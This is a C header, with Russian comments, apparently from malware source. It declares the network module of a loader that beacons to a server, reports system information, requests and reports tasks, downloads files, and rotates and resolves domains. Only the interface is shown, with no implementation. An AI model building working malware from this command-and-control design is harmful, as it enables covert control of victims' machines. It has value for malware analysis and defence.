#ifndef __MOD_NETCOMMAPI_H_
#define __MOD_NETCOMMAPI_H_

// Варианты отстуков.
typedef enum 
{
    NRT_DOWNLOAD_FILE = 0x00,
    NRT_SYSTEM_INFO = 0x01,
    NRT_TASKS_REQUEST,
    NRT_TASKS_REPORT,
    NRT_BUNDLE_CHECK,
} netcomm_request_type;

//#define KNOCK_SEND_TASKS_RESULTS    0x04
//#define KNOCK_SEND_HOTFIXES            0x11


#define ERR_TRIED_LAST_URL    MOD_NETCOMMON_ERR_BASE - 1
#define ERR_BAD_SERVER_RESPONSE    MOD_NETCOMMON_ERR_BASE - 2

// Данная функция не проверяет указатели на нули, поэтому все параметры всегда должны быть не нулевыми.
typedef void (*Fnnetcomm_free_previous_resources)();
typedef int (*Fnnetcomm_parse_uri)(const char* uri, char** pHostName, uint16_t* pPort, char** pHostPort, char** pPath, uint32_t* pPathLen);
typedef char* (*Fnnetcomm_generate_boundary_separator_for_nrt)(netcomm_request_type nrt);
typedef void (*Fnnetcomm_generate_random_name)(uint32_t* pSeed, char* name, uint32_t nameMaxSize);
typedef char* (*Fnnetcomm_prepare_request)(netcomm_request_type nrt, const char* host, const char* url, uint32_t* pHttpRequestLen);
typedef int (*Fnnetcomm_valide_response)(const char* httpResponse, uint32_t httpResponseLen, const char** pHttpBody, uint32_t* pHttpBodyLen);
typedef int (*Fnnetcomm_make_server_transaction)(uint32_t serverAddr, uint16_t port, const char* httpRequest, uint32_t httpRequestLen, uint8_t** pHttpBody, uint32_t* pHttpBodySize, uint8_t** pHttpResponse);

typedef bool_t (*Fnnetcomm_parse_http_header)(const char** pItr, const char* end, uint16_t* pHttpCode, uint32_t* pContentLen);



typedef struct _mod_netcomm_private
{
    Fnnetcomm_free_previous_resources fnnetcomm_free_previous_resources;
    Fnnetcomm_parse_uri fnnetcomm_parse_uri;
    Fnnetcomm_generate_boundary_separator_for_nrt fnnetcomm_generate_boundary_separator_for_nrt;
    Fnnetcomm_generate_random_name fnnetcomm_generate_random_name;
    Fnnetcomm_prepare_request fnnetcomm_prepare_request;
    Fnnetcomm_valide_response fnnetcomm_valide_response;
    Fnnetcomm_make_server_transaction fnnetcomm_make_server_transaction;
    Fnnetcomm_parse_http_header fnnetcomm_parse_http_header;

    uint8_t* pModBase;

    char postQuery[24];
    char getQuery[50];
    char hdrHost[16];
    char hdrContentType[56];
    char hdrContentLength[24];
    char hdrUserAgent[88];
    char hdrUserAgentx64[16];
    char contentDispBlock[64]; 
    char blockTypeFields[88]; 
    char encTypes[16];
    
    char httpPostBody[72];
    char constWords[8];

        // параметры которые могут менять во время работы лоадера
    char* activeName;
    char* activeZone;
    char* domainName;
    struct netconn* pConnection;
    char* server;
    uint16_t port;
    char* domainPort;
    char* remotePath;
    bool_t userMode;
} mod_netcomm_private, *pmod_netcomm_private;

// Интерфейсные функции
typedef void (*Fnnetcomm_select_active_element)(bool_t isName);
typedef bool_t (*Fnnetcomm_resolve_active_domain)();
typedef uint32_t (*Fnnetcomm_rotate)();
typedef void (*Fnnetcomm_shutdown_routine)();

/**    Отправляет информацию о машине на сервер.

    dataFromServer    - указатель на буфер, в котором будут лежать данные полученные от сервера.
    dataSize        - указатель на переменную, куда будет сохранён размер данных.
*/
typedef int (*Fnnetcomm_send_request_to_server)(netcomm_request_type nrt, uint8_t** pHttpBody, uint32_t* pHttpBodySize, uint8_t** pHttpResponse);

typedef struct _mod_netcomm_block
{
    Fnnetcomm_select_active_element fnnetcomm_select_active_element;
    Fnnetcomm_resolve_active_domain fnnetcomm_resolve_active_domain;
    Fnnetcomm_rotate fnnetcomm_rotate;
    Fnnetcomm_shutdown_routine fnnetcomm_shutdown_routine;
    Fnnetcomm_send_request_to_server fnnetcomm_send_request_to_server;

    mod_netcomm_private;
} mod_netcomm_block_t, *pmod_netcomm_block_t;

#endif // __MOD_NETCOMMAPI_H_
